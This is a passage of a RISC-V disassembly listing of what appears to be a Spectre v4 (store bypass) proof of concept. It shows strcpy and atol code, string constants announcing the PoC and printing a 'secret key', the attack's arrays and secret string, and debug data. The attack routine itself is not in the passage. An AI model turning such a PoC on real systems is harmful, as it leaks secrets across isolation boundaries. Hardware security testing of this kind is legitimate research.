    8000267a:	fef44783          	lbu	a5,-17(s0)
    8000267e:	0007871b          	sext.w	a4,a5
    80002682:	fee44783          	lbu	a5,-18(s0)
    80002686:	2781                	sext.w	a5,a5
    80002688:	40f707bb          	subw	a5,a4,a5
    8000268c:	2781                	sext.w	a5,a5
}
    8000268e:	853e                	mv	a0,a5
    80002690:	7422                	ld	s0,40(sp)
    80002692:	6145                	addi	sp,sp,48
    80002694:	8082                	ret

0000000080002696 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    80002696:	7179                	addi	sp,sp,-48
    80002698:	f422                	sd	s0,40(sp)
    8000269a:	1800                	addi	s0,sp,48
    8000269c:	fca43c23          	sd	a0,-40(s0)
    800026a0:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026a4:	fd843783          	ld	a5,-40(s0)
    800026a8:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    800026ac:	0001                	nop
    800026ae:	fd043703          	ld	a4,-48(s0)
    800026b2:	00170793          	addi	a5,a4,1
    800026b6:	fcf43823          	sd	a5,-48(s0)
    800026ba:	fe843783          	ld	a5,-24(s0)
    800026be:	00178693          	addi	a3,a5,1
    800026c2:	fed43423          	sd	a3,-24(s0)
    800026c6:	00074703          	lbu	a4,0(a4)
    800026ca:	00e78023          	sb	a4,0(a5)
    800026ce:	0007c783          	lbu	a5,0(a5)
    800026d2:	fff1                	bnez	a5,800026ae <strcpy+0x18>
    ;
  return dest;
    800026d4:	fd843783          	ld	a5,-40(s0)
}
    800026d8:	853e                	mv	a0,a5
    800026da:	7422                	ld	s0,40(sp)
    800026dc:	6145                	addi	sp,sp,48
    800026de:	8082                	ret

00000000800026e0 <atol>:

long atol(const char* str)
{
    800026e0:	7179                	addi	sp,sp,-48
    800026e2:	f422                	sd	s0,40(sp)
    800026e4:	1800                	addi	s0,sp,48
    800026e6:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    800026ea:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    800026ee:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    800026f2:	a031                	j	800026fe <atol+0x1e>
    str++;
    800026f4:	fd843783          	ld	a5,-40(s0)
    800026f8:	0785                	addi	a5,a5,1
    800026fa:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    800026fe:	fd843783          	ld	a5,-40(s0)
    80002702:	0007c783          	lbu	a5,0(a5)
    80002706:	873e                	mv	a4,a5
    80002708:	02000793          	li	a5,32
    8000270c:	fef704e3          	beq	a4,a5,800026f4 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002710:	fd843783          	ld	a5,-40(s0)
    80002714:	0007c783          	lbu	a5,0(a5)
    80002718:	873e                	mv	a4,a5
    8000271a:	02d00793          	li	a5,45
    8000271e:	00f70b63          	beq	a4,a5,80002734 <atol+0x54>
    80002722:	fd843783          	ld	a5,-40(s0)
    80002726:	0007c783          	lbu	a5,0(a5)
    8000272a:	873e                	mv	a4,a5
    8000272c:	02b00793          	li	a5,43
    80002730:	06f71263          	bne	a4,a5,80002794 <atol+0xb4>
    sign = *str == '-';
    80002734:	fd843783          	ld	a5,-40(s0)
    80002738:	0007c783          	lbu	a5,0(a5)
    8000273c:	0007871b          	sext.w	a4,a5
    80002740:	02d00793          	li	a5,45
    80002744:	40f707b3          	sub	a5,a4,a5
    80002748:	0017b793          	seqz	a5,a5
    8000274c:	0ff7f793          	andi	a5,a5,255
    80002750:	fef42223          	sw	a5,-28(s0)
    str++;
    80002754:	fd843783          	ld	a5,-40(s0)
    80002758:	0785                	addi	a5,a5,1
    8000275a:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    8000275e:	a81d                	j	80002794 <atol+0xb4>
    res *= 10;
    80002760:	fe843703          	ld	a4,-24(s0)
    80002764:	87ba                	mv	a5,a4
    80002766:	078a                	slli	a5,a5,0x2
    80002768:	97ba                	add	a5,a5,a4
    8000276a:	0786                	slli	a5,a5,0x1
    8000276c:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    80002770:	fd843783          	ld	a5,-40(s0)
    80002774:	00178713          	addi	a4,a5,1
    80002778:	fce43c23          	sd	a4,-40(s0)
    8000277c:	0007c783          	lbu	a5,0(a5)
    80002780:	2781                	sext.w	a5,a5
    80002782:	fd07879b          	addiw	a5,a5,-48
    80002786:	2781                	sext.w	a5,a5
    80002788:	873e                	mv	a4,a5
    8000278a:	fe843783          	ld	a5,-24(s0)
    8000278e:	97ba                	add	a5,a5,a4
    80002790:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002794:	fd843783          	ld	a5,-40(s0)
    80002798:	0007c783          	lbu	a5,0(a5)
    8000279c:	f3f1                	bnez	a5,80002760 <atol+0x80>
  }

  return sign ? -res : res;
    8000279e:	fe442783          	lw	a5,-28(s0)
    800027a2:	2781                	sext.w	a5,a5
    800027a4:	c791                	beqz	a5,800027b0 <atol+0xd0>
    800027a6:	fe843783          	ld	a5,-24(s0)
    800027aa:	40f007b3          	neg	a5,a5
    800027ae:	a019                	j	800027b4 <atol+0xd4>
    800027b0:	fe843783          	ld	a5,-24(s0)
}
    800027b4:	853e                	mv	a0,a5
    800027b6:	7422                	ld	s0,40(sp)
    800027b8:	6145                	addi	sp,sp,48
    800027ba:	8082                	ret

Disassembly of section .rodata:

00000000800027c0 <.rodata>:
    800027c0:	2221                	addiw	tp,tp,8
    800027c2:	69685423          	0x69685423
    800027c6:	54734973          	0x54734973
    800027ca:	6568                	ld	a0,200(a0)
    800027cc:	6142                	ld	sp,16(sp)
    800027ce:	7962                	ld	s2,56(sp)
    800027d0:	6f42                	ld	t5,16(sp)
    800027d2:	72656d6f          	jal	s10,80058ef8 <_end+0x3d278>
    800027d6:	6554                	ld	a3,136(a0)
    800027d8:	00007473          	csrrci	s0,ustatus,0
    800027dc:	0000                	unimp
    800027de:	0000                	unimp
    800027e0:	3d3d                	addiw	s10,s10,-17
    800027e2:	3d3d                	addiw	s10,s10,-17
    800027e4:	3d3d                	addiw	s10,s10,-17
    800027e6:	3d3d                	addiw	s10,s10,-17
    800027e8:	3d3d                	addiw	s10,s10,-17
    800027ea:	3d3d                	addiw	s10,s10,-17
    800027ec:	3d3d                	addiw	s10,s10,-17
    800027ee:	3d3d                	addiw	s10,s10,-17
    800027f0:	203d                	0x203d
    800027f2:	6854                	ld	a3,144(s0)
    800027f4:	7369                	lui	t1,0xffffa
    800027f6:	6920                	ld	s0,80(a0)
    800027f8:	20612073          	csrs	0x206,sp
    800027fc:	4f50                	lw	a2,28(a4)
    800027fe:	666f2043          	fmadd.q	ft0,ft10,ft6,fa2,rdn
    80002802:	7320                	ld	s0,96(a4)
    80002804:	6570                	ld	a2,200(a0)
    80002806:	65727463          	bleu	s7,tp,80002e4e <dummyMem+0x28e>
    8000280a:	765f 2034 5328      	0x53282034765f
    80002810:	6f74                	ld	a3,216(a4)
    80002812:	6572                	ld	a0,280(sp)
    80002814:	4220                	lw	s0,64(a2)
    80002816:	7079                	c.lui	zero,0xffffe
    80002818:	7361                	lui	t1,0xffff8
    8000281a:	3d202973          	csrr	s2,0x3d2
    8000281e:	3d3d                	addiw	s10,s10,-17
    80002820:	3d3d                	addiw	s10,s10,-17
    80002822:	3d3d                	addiw	s10,s10,-17
    80002824:	3d3d                	addiw	s10,s10,-17
    80002826:	3d3d                	addiw	s10,s10,-17
    80002828:	3d3d                	addiw	s10,s10,-17
    8000282a:	3d3d                	addiw	s10,s10,-17
    8000282c:	3d3d                	addiw	s10,s10,-17
    8000282e:	3d3d                	addiw	s10,s10,-17
    80002830:	3d3d                	addiw	s10,s10,-17
    80002832:	3d3d                	addiw	s10,s10,-17
    80002834:	3d3d                	addiw	s10,s10,-17
    80002836:	0a20                	addi	s0,sp,280
	...
    80002840:	6874                	ld	a3,208(s0)
    80002842:	2065                	0x2065
    80002844:	72636573          	csrrsi	a0,0x726,6
    80002848:	7465                	lui	s0,0xffff9
    8000284a:	6b20                	ld	s0,80(a4)
    8000284c:	7965                	lui	s2,0xffff9
    8000284e:	6920                	ld	s0,80(a0)
    80002850:	73253a73          	csrrc	s4,0x732,a0
    80002854:	0a20                	addi	s0,sp,280
    80002856:	0000                	unimp
    80002858:	3b305b1b          	0x3b305b1b
    8000285c:	333b3233          	0x333b3233
    80002860:	6d32                	ld	s10,264(sp)
    80002862:	6176                	ld	sp,344(sp)
    80002864:	6464                	ld	s1,200(s0)
    80002866:	5b72                	lw	s6,60(sp)
    80002868:	3025                	0x3025
    8000286a:	3031                	0x3031
    8000286c:	5d70                	lw	a2,124(a0)
    8000286e:	203a                	fld	ft0,392(sp)
    80002870:	746e6177          	0x746e6177
    80002874:	2528                	fld	fa0,72(a0)
    80002876:	3a202963          	0x3a202963
    8000287a:	2820                	fld	fs0,80(s0)
    8000287c:	6968                	ld	a0,208(a0)
    8000287e:	2d74                	fld	fa3,216(a0)
    80002880:	6974                	ld	a3,208(a0)
    80002882:	656d                	lui	a0,0x1b
    80002884:	53412c73          	csrrs	s8,0x534,sp
    80002888:	4349                	li	t1,18
    8000288a:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    8000288e:	7261                	lui	tp,0xffff8
    80002890:	2029                	0x2029
    80002892:	203d                	0x203d
    80002894:	2e31                	addiw	t3,t3,12
    80002896:	2528                	fld	fa0,72(a0)
    80002898:	756c                	ld	a1,232(a0)
    8000289a:	202c                	fld	fa1,64(s0)
    8000289c:	6425                	lui	s0,0x9
    8000289e:	202c                	fld	fa1,64(s0)
    800028a0:	6325                	lui	t1,0x9
    800028a2:	2029                	0x2029
    800028a4:	2e32                	fld	ft8,264(sp)
    800028a6:	2528                	fld	fa0,72(a0)
    800028a8:	756c                	ld	a1,232(a0)
    800028aa:	202c                	fld	fa1,64(s0)
    800028ac:	6425                	lui	s0,0x9
    800028ae:	202c                	fld	fa1,64(s0)
    800028b0:	6325                	lui	t1,0x9
    800028b2:	1b29                	addi	s6,s6,-22
    800028b4:	000a6d5b          	0xa6d5b
    800028b8:	3b305b1b          	0x3b305b1b
    800028bc:	333b3233          	0x333b3233
    800028c0:	6d31                	lui	s10,0xc
    800028c2:	6176                	ld	sp,344(sp)
    800028c4:	6464                	ld	s1,200(s0)
    800028c6:	5b72                	lw	s6,60(sp)
    800028c8:	3025                	0x3025
    800028ca:	3031                	0x3031
    800028cc:	5d70                	lw	a2,124(a0)
    800028ce:	203a                	fld	ft0,392(sp)
    800028d0:	746e6177          	0x746e6177
    800028d4:	2528                	fld	fa0,72(a0)
    800028d6:	3a202963          	0x3a202963
    800028da:	2820                	fld	fs0,80(s0)
    800028dc:	6968                	ld	a0,208(a0)
    800028de:	2d74                	fld	fa3,216(a0)
    800028e0:	6974                	ld	a3,208(a0)
    800028e2:	656d                	lui	a0,0x1b
    800028e4:	53412c73          	csrrs	s8,0x534,sp
    800028e8:	4349                	li	t1,18
    800028ea:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    800028ee:	7261                	lui	tp,0xffff8
    800028f0:	2029                	0x2029
    800028f2:	203d                	0x203d
    800028f4:	2e31                	addiw	t3,t3,12
    800028f6:	2528                	fld	fa0,72(a0)
    800028f8:	756c                	ld	a1,232(a0)
    800028fa:	202c                	fld	fa1,64(s0)
    800028fc:	6425                	lui	s0,0x9
    800028fe:	202c                	fld	fa1,64(s0)
    80002900:	6325                	lui	t1,0x9
    80002902:	2029                	0x2029
    80002904:	2e32                	fld	ft8,264(sp)
    80002906:	2528                	fld	fa0,72(a0)
    80002908:	756c                	ld	a1,232(a0)
    8000290a:	202c                	fld	fa1,64(s0)
    8000290c:	6425                	lui	s0,0x9
    8000290e:	202c                	fld	fa1,64(s0)
    80002910:	6325                	lui	t1,0x9
    80002912:	1b29                	addi	s6,s6,-22
    80002914:	000a6d5b          	0xa6d5b
    80002918:	636d                	lui	t1,0x1b
    8000291a:	6379                	lui	t1,0x1e
    8000291c:	656c                	ld	a1,200(a0)
    8000291e:	0000                	unimp
    80002920:	696d                	lui	s2,0x1b
    80002922:	736e                	ld	t1,248(sp)
    80002924:	7274                	ld	a3,224(a2)
    80002926:	7465                	lui	s0,0xffff9
	...
    80002930:	6d49                	lui	s10,0x12
    80002932:	6c70                	ld	a2,216(s0)
    80002934:	6d65                	lui	s10,0x19
    80002936:	6e65                	lui	t3,0x19
    80002938:	2074                	fld	fa3,192(s0)
    8000293a:	616d                	addi	sp,sp,240
    8000293c:	6e69                	lui	t3,0x1a
    8000293e:	2928                	fld	fa0,80(a0)
    80002940:	202c                	fld	fa1,64(s0)
    80002942:	6f66                	ld	t5,88(sp)
    80002944:	000a216f          	jal	sp,800a4944 <_end+0x88cc4>
    80002948:	7325                	lui	t1,0xfffe9
    8000294a:	3d20                	fld	fs0,120(a0)
    8000294c:	2520                	fld	fs0,72(a0)
    8000294e:	646c                	ld	a1,200(s0)
    80002950:	000a                	c.slli	zero,0x2
    80002952:	0000                	unimp
    80002954:	0000                	unimp
    80002956:	0000                	unimp
    80002958:	6e28                	ld	a0,88(a2)
    8000295a:	6c75                	lui	s8,0x1d
    8000295c:	296c                	fld	fa1,208(a0)
    8000295e:	0000                	unimp
    80002960:	f746                	sd	a7,424(sp)
    80002962:	ffff                	0xffff
    80002964:	f930                	sd	a2,112(a0)
    80002966:	ffff                	0xffff
    80002968:	f922                	sd	s0,176(sp)
    8000296a:	ffff                	0xffff
    8000296c:	f930                	sd	a2,112(a0)
    8000296e:	ffff                	0xffff
    80002970:	f930                	sd	a2,112(a0)
    80002972:	ffff                	0xffff
    80002974:	f930                	sd	a2,112(a0)
    80002976:	ffff                	0xffff
    80002978:	f930                	sd	a2,112(a0)
    8000297a:	ffff                	0xffff
    8000297c:	f722                	sd	s0,424(sp)
    8000297e:	ffff                	0xffff
    80002980:	f930                	sd	a2,112(a0)
    80002982:	ffff                	0xffff
    80002984:	f930                	sd	a2,112(a0)
    80002986:	ffff                	0xffff
    80002988:	f6c0                	sd	s0,168(a3)
    8000298a:	ffff                	0xffff
    8000298c:	f736                	sd	a3,424(sp)
    8000298e:	ffff                	0xffff
    80002990:	f930                	sd	a2,112(a0)
    80002992:	ffff                	0xffff
    80002994:	f6ca                	sd	s2,360(sp)
    80002996:	ffff                	0xffff
    80002998:	f6d4                	sd	a3,168(a3)
    8000299a:	ffff                	0xffff
    8000299c:	f6d4                	sd	a3,168(a3)
    8000299e:	ffff                	0xffff
    800029a0:	f6d4                	sd	a3,168(a3)
    800029a2:	ffff                	0xffff
    800029a4:	f6d4                	sd	a3,168(a3)
    800029a6:	ffff                	0xffff
    800029a8:	f6d4                	sd	a3,168(a3)
    800029aa:	ffff                	0xffff
    800029ac:	f6d4                	sd	a3,168(a3)
    800029ae:	ffff                	0xffff
    800029b0:	f6d4                	sd	a3,168(a3)
    800029b2:	ffff                	0xffff
    800029b4:	f6d4                	sd	a3,168(a3)
    800029b6:	ffff                	0xffff
    800029b8:	f6d4                	sd	a3,168(a3)
    800029ba:	ffff                	0xffff
    800029bc:	f930                	sd	a2,112(a0)
    800029be:	ffff                	0xffff
    800029c0:	f930                	sd	a2,112(a0)
    800029c2:	ffff                	0xffff
    800029c4:	f930                	sd	a2,112(a0)
    800029c6:	ffff                	0xffff
    800029c8:	f930                	sd	a2,112(a0)
    800029ca:	ffff                	0xffff
    800029cc:	f930                	sd	a2,112(a0)
    800029ce:	ffff                	0xffff
    800029d0:	f930                	sd	a2,112(a0)
    800029d2:	ffff                	0xffff
    800029d4:	f930                	sd	a2,112(a0)
    800029d6:	ffff                	0xffff
    800029d8:	f930                	sd	a2,112(a0)
    800029da:	ffff                	0xffff
    800029dc:	f930                	sd	a2,112(a0)
    800029de:	ffff                	0xffff
    800029e0:	f930                	sd	a2,112(a0)
    800029e2:	ffff                	0xffff
    800029e4:	f930                	sd	a2,112(a0)
    800029e6:	ffff                	0xffff
    800029e8:	f930                	sd	a2,112(a0)
    800029ea:	ffff                	0xffff
    800029ec:	f930                	sd	a2,112(a0)
    800029ee:	ffff                	0xffff
    800029f0:	f930                	sd	a2,112(a0)
    800029f2:	ffff                	0xffff
    800029f4:	f930                	sd	a2,112(a0)
    800029f6:	ffff                	0xffff
    800029f8:	f930                	sd	a2,112(a0)
    800029fa:	ffff                	0xffff
    800029fc:	f930                	sd	a2,112(a0)
    800029fe:	ffff                	0xffff
    80002a00:	f930                	sd	a2,112(a0)
    80002a02:	ffff                	0xffff
    80002a04:	f930                	sd	a2,112(a0)
    80002a06:	ffff                	0xffff
    80002a08:	f930                	sd	a2,112(a0)
    80002a0a:	ffff                	0xffff
    80002a0c:	f930                	sd	a2,112(a0)
    80002a0e:	ffff                	0xffff
    80002a10:	f930                	sd	a2,112(a0)
    80002a12:	ffff                	0xffff
    80002a14:	f930                	sd	a2,112(a0)
    80002a16:	ffff                	0xffff
    80002a18:	f930                	sd	a2,112(a0)
    80002a1a:	ffff                	0xffff
    80002a1c:	f930                	sd	a2,112(a0)
    80002a1e:	ffff                	0xffff
    80002a20:	f930                	sd	a2,112(a0)
    80002a22:	ffff                	0xffff
    80002a24:	f930                	sd	a2,112(a0)
    80002a26:	ffff                	0xffff
    80002a28:	f930                	sd	a2,112(a0)
    80002a2a:	ffff                	0xffff
    80002a2c:	f930                	sd	a2,112(a0)
    80002a2e:	ffff                	0xffff
    80002a30:	f930                	sd	a2,112(a0)
    80002a32:	ffff                	0xffff
    80002a34:	f930                	sd	a2,112(a0)
    80002a36:	ffff                	0xffff
    80002a38:	f930                	sd	a2,112(a0)
    80002a3a:	ffff                	0xffff
    80002a3c:	f930                	sd	a2,112(a0)
    80002a3e:	ffff                	0xffff
    80002a40:	f930                	sd	a2,112(a0)
    80002a42:	ffff                	0xffff
    80002a44:	f930                	sd	a2,112(a0)
    80002a46:	ffff                	0xffff
    80002a48:	f930                	sd	a2,112(a0)
    80002a4a:	ffff                	0xffff
    80002a4c:	f930                	sd	a2,112(a0)
    80002a4e:	ffff                	0xffff
    80002a50:	f930                	sd	a2,112(a0)
    80002a52:	ffff                	0xffff
    80002a54:	f930                	sd	a2,112(a0)
    80002a56:	ffff                	0xffff
    80002a58:	f930                	sd	a2,112(a0)
    80002a5a:	ffff                	0xffff
    80002a5c:	f930                	sd	a2,112(a0)
    80002a5e:	ffff                	0xffff
    80002a60:	f776                	sd	t4,424(sp)
    80002a62:	ffff                	0xffff
    80002a64:	f876                	sd	t4,48(sp)
    80002a66:	ffff                	0xffff
    80002a68:	f930                	sd	a2,112(a0)
    80002a6a:	ffff                	0xffff
    80002a6c:	f930                	sd	a2,112(a0)
    80002a6e:	ffff                	0xffff
    80002a70:	f930                	sd	a2,112(a0)
    80002a72:	ffff                	0xffff
    80002a74:	f930                	sd	a2,112(a0)
    80002a76:	ffff                	0xffff
    80002a78:	f930                	sd	a2,112(a0)
    80002a7a:	ffff                	0xffff
    80002a7c:	f930                	sd	a2,112(a0)
    80002a7e:	ffff                	0xffff
    80002a80:	f930                	sd	a2,112(a0)
    80002a82:	ffff                	0xffff
    80002a84:	f76a                	sd	s10,424(sp)
    80002a86:	ffff                	0xffff
    80002a88:	f930                	sd	a2,112(a0)
    80002a8a:	ffff                	0xffff
    80002a8c:	f930                	sd	a2,112(a0)
    80002a8e:	ffff                	0xffff
    80002a90:	f8be                	sd	a5,112(sp)
    80002a92:	ffff                	0xffff
    80002a94:	f8c6                	sd	a7,112(sp)
    80002a96:	ffff                	0xffff
    80002a98:	f930                	sd	a2,112(a0)
    80002a9a:	ffff                	0xffff
    80002a9c:	f930                	sd	a2,112(a0)
    80002a9e:	ffff                	0xffff
    80002aa0:	f792                	sd	tp,488(sp)
    80002aa2:	ffff                	0xffff
    80002aa4:	f930                	sd	a2,112(a0)
    80002aa6:	ffff                	0xffff
    80002aa8:	f8b6                	sd	a3,112(sp)
    80002aaa:	ffff                	0xffff
    80002aac:	f930                	sd	a2,112(a0)
    80002aae:	ffff                	0xffff
    80002ab0:	f930                	sd	a2,112(a0)
    80002ab2:	ffff                	0xffff
    80002ab4:	f8e8                	sd	a0,240(s1)
    80002ab6:	ffff                	0xffff

Disassembly of section .data:

0000000080002ac0 <array1>:
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    80002ac0:	0201                	addi	tp,tp,0
    80002ac2:	06050403          	lb	s0,96(a0) # 1b060 <_tbss_end+0x1afdc>
    80002ac6:	0a090807          	0xa090807
    80002aca:	0e0d0c0b          	0xe0d0c0b
    80002ace:	0000100f          	fence.i
	...

Disassembly of section .sdata:

0000000080002b60 <array1_sz>:
uint64_t array1_sz = 16;
    80002b60:	0010                	0x10
    80002b62:	0000                	unimp
    80002b64:	0000                	unimp
	...

0000000080002b68 <secretString>:
char* secretString = "!\"#ThisIsTheBabyBoomerTest";
    80002b68:	27c0                	fld	fs0,136(a5)
    80002b6a:	8000                	0x8000
    80002b6c:	0000                	unimp
	...

0000000080002b70 <str_index>:
uint64_t   str_index = 1;
    80002b70:	0001                	nop
    80002b72:	0000                	unimp
    80002b74:	0000                	unimp
	...

0000000080002b78 <dummy>:
uint8_t    dummy = 2;
    80002b78:	0002                	c.slli	zero,0x0
    80002b7a:	0000                	unimp
    80002b7c:	0000                	unimp
	...

0000000080002b80 <div>:
uint64_t   div = 2;
    80002b80:	0002                	c.slli	zero,0x0
    80002b82:	0000                	unimp
    80002b84:	0000                	unimp
	...

Disassembly of section .sbss:

0000000080002b88 <temp>:
	...

Disassembly of section .bss:

0000000080002bc0 <dummyMem>:
	...

0000000080016bc0 <unused1>:
	...

0000000080016c00 <unused2>:
	...

0000000080016c40 <array2>:
	...

000000008001ac40 <str>:
	...

000000008001b440 <results.2500>:
	...

000000008001bc40 <counters>:
	...

000000008001bc50 <counter_names>:
	...

000000008001bc60 <count.2896>:
    8001bc60:	0000                	unimp
	...

000000008001bc64 <sense.2895>:
    8001bc64:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001bc80 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	0d5e                	slli	s10,s10,0x17
       2:	0000                	unimp
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	02a1                	addi	t0,t0,8
       e:	0000                	unimp
      10:	890c                	0x890c
      12:	0002                	c.slli	zero,0x0
      14:	9300                	0x9300
      16:	0004                	0x4
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	3200                	fld	fs0,32(a2)
      22:	0005                	c.nop	1
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	03b4                	addi	a3,sp,456
      32:	0000                	unimp
      34:	00003003          	ld	zero,0(zero) # ffffffffffffe000 <_end+0xffffffff7ffe2380>
      38:	0300                	addi	s0,sp,384
      3a:	00003f2b          	0x3f2b
      3e:	0200                	addi	s0,sp,256
      40:	0801                	addi	a6,a6,0
      42:	03b2                	slli	t2,t2,0xc
      44:	0000                	unimp
      46:	0202                	slli	tp,tp,0x0
      48:	d705                	beqz	a4,ffffffffffffff70 <_end+0xffffffff7ffe42f0>
      4a:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
      4e:	0702                	slli	a4,a4,0x0
      50:	0226                	slli	tp,tp,0x9
      52:	0000                	unimp
      54:	0404                	addi	s1,sp,512
      56:	6905                	lui	s2,0x1
      58:	746e                	ld	s0,248(sp)
      5a:	0200                	addi	s0,sp,256
      5c:	0704                	addi	s1,sp,896
      5e:	006e                	c.slli	zero,0x1b
      60:	0000                	unimp
      62:	0802                	slli	a6,a6,0x0
      64:	d705                	beqz	a4,ffffffffffffff8c <_end+0xffffffff7ffe430c>
      66:	0000                	unimp
      68:	0300                	addi	s0,sp,384
      6a:	00000377          	0x377
      6e:	00746903          	lwu	s2,7(s0) # ffffffffffff9007 <_end+0xffffffff7ffdd387>
      72:	0000                	unimp
      74:	0802                	slli	a6,a6,0x0
      76:	00006907          	0x6907
      7a:	0200                	addi	s0,sp,256
      7c:	0508                	addi	a0,sp,640
      7e:	00d2                	slli	ra,ra,0x14
      80:	0000                	unimp
      82:	1002                	c.slli	zero,0x20
      84:	2604                	fld	fs1,8(a2)
      86:	03000003          	lb	zero,48(zero) # 30 <_tdata_begin+0x30>
      8a:	00000393          	li	t2,0
      8e:	0704                	addi	s1,sp,896
      90:	0054                	addi	a3,sp,4
      92:	0000                	unimp
      94:	00036203          	lwu	tp,0(t1) # fffffffffffe9000 <_end+0xffffffff7ffcd380>
      98:	0500                	addi	s0,sp,640
      9a:	622c                	ld	a1,64(a2)
      9c:	0000                	unimp
      9e:	0300                	addi	s0,sp,384
      a0:	04c2                	slli	s1,s1,0x10
      a2:	0000                	unimp
      a4:	7205                	lui	tp,0xfffe1
      a6:	0062                	c.slli	zero,0x18
      a8:	0000                	unimp
      aa:	00056403          	lwu	s0,0(a0)
      ae:	0500                	addi	s0,sp,640
      b0:	6291                	lui	t0,0x4
      b2:	0000                	unimp
      b4:	0500                	addi	s0,sp,640
      b6:	0274                	addi	a3,sp,268
      b8:	0000                	unimp
      ba:	6506                	ld	a0,64(sp)
      bc:	5b01                	li	s6,-32
      be:	0000                	unimp
      c0:	0600                	addi	s0,sp,768
      c2:	0504                	addi	s1,sp,640
      c4:	e0a6                	sd	s1,64(sp)
      c6:	0000                	unimp
      c8:	0700                	addi	s0,sp,896
      ca:	026e                	slli	tp,tp,0x1b
      cc:	0000                	unimp
      ce:	a805                	j	fe <_tbss_end+0x7a>
      d0:	00b5                	addi	ra,ra,13
      d2:	0000                	unimp
      d4:	0001fa07          	0x1fa07
      d8:	0500                	addi	s0,sp,640
      da:	e0a9                	bnez	s1,11c <_tbss_end+0x98>
      dc:	0000                	unimp
      de:	0000                	unimp
      e0:	3f08                	fld	fa0,56(a4)
      e2:	0000                	unimp
      e4:	f000                	sd	s0,32(s0)
      e6:	0000                	unimp
      e8:	0900                	addi	s0,sp,144
      ea:	0074                	addi	a3,sp,12
      ec:	0000                	unimp
      ee:	080a0003          	lb	zero,128(s4)
      f2:	a305                	j	612 <_tbss_end+0x58e>
      f4:	0111                	addi	sp,sp,4
      f6:	0000                	unimp
      f8:	00047d0b          	0x47d0b
      fc:	0500                	addi	s0,sp,640
      fe:	54a5                	li	s1,-23
     100:	0000                	unimp
     102:	0000                	unimp
     104:	0004850b          	0x4850b
     108:	0500                	addi	s0,sp,640
     10a:	c1aa                	sw	a0,192(sp)
     10c:	0000                	unimp
     10e:	0400                	addi	s0,sp,512
     110:	0300                	addi	s0,sp,384
     112:	03ff                	0x3ff
     114:	0000                	unimp
     116:	ab05                	j	646 <_tbss_end+0x5c2>
     118:	00f0                	addi	a2,sp,76
     11a:	0000                	unimp
     11c:	0001b103          	ld	sp,0(gp) # 80003360 <__global_pointer$>
     120:	0500                	addi	s0,sp,640
     122:	000089af          	0x89af
     126:	0c00                	addi	s0,sp,528
     128:	0308                	addi	a0,sp,384
     12a:	0000050f          	0x50f
     12e:	005b1907          	0x5b1907
     132:	0000                	unimp
     134:	c20d                	beqz	a2,156 <_tbss_end+0xd2>
     136:	0001                	nop
     138:	2000                	fld	fs0,0(s0)
     13a:	01872f07          	flw	ft10,24(a4)
     13e:	0000                	unimp
     140:	0004200b          	0x4200b
     144:	0700                	addi	s0,sp,896
     146:	8731                	srai	a4,a4,0xc
     148:	0001                	nop
     14a:	0000                	unimp
     14c:	5f0e                	lw	t5,224(sp)
     14e:	3207006b          	0x3207006b
     152:	0054                	addi	a3,sp,4
     154:	0000                	unimp
     156:	0b08                	addi	a0,sp,400
     158:	0468                	addi	a0,sp,524
     15a:	0000                	unimp
     15c:	00543207          	fld	ft4,5(s0)
     160:	0000                	unimp
     162:	0b0c                	addi	a1,sp,400
     164:	01a5                	addi	gp,gp,9
     166:	0000                	unimp
     168:	00543207          	fld	ft4,5(s0)
     16c:	0000                	unimp
     16e:	0b10                	addi	a2,sp,400
     170:	0000054f          	fnmadd.s	fa0,ft0,ft0,ft0,rne
     174:	00543207          	fld	ft4,5(s0)
     178:	0000                	unimp
     17a:	0e14                	addi	a3,sp,784
     17c:	785f 0700 8d33      	0x8d330700785f
     182:	0001                	nop
     184:	1800                	addi	s0,sp,48
     186:	0f00                	addi	s0,sp,912
     188:	3408                	fld	fa0,40(s0)
     18a:	0001                	nop
     18c:	0800                	addi	s0,sp,16
     18e:	0129                	addi	sp,sp,10
     190:	0000                	unimp
     192:	019d                	addi	gp,gp,7
     194:	0000                	unimp
     196:	7409                	lui	s0,0xfffe2
     198:	0000                	unimp
     19a:	0000                	unimp
     19c:	0d00                	addi	s0,sp,656
     19e:	01e9                	addi	gp,gp,26
     1a0:	0000                	unimp
     1a2:	0724                	addi	s1,sp,904
     1a4:	00021637          	lui	a2,0x21
     1a8:	0b00                	addi	s0,sp,400
     1aa:	000000bf 00543907 	0x543907000000bf
     1b2:	0000                	unimp
     1b4:	0b00                	addi	s0,sp,400
     1b6:	04d4                	addi	a3,sp,580
     1b8:	0000                	unimp
     1ba:	00543a07          	fld	fs4,5(s0) # fffffffffffe2005 <_end+0xffffffff7ffc6385>
     1be:	0000                	unimp
     1c0:	0b04                	addi	s1,sp,400
     1c2:	00f2                	slli	ra,ra,0x1c
     1c4:	0000                	unimp
     1c6:	00543b07          	fld	fs6,5(s0)
     1ca:	0000                	unimp
     1cc:	0b08                	addi	a0,sp,400
     1ce:	000005ef          	jal	a1,1ce <_tbss_end+0x14a>
     1d2:	00543c07          	fld	fs8,5(s0)
     1d6:	0000                	unimp
     1d8:	0b0c                	addi	a1,sp,400
     1da:	0346                	slli	t1,t1,0x11
     1dc:	0000                	unimp
     1de:	00543d07          	fld	fs10,5(s0)
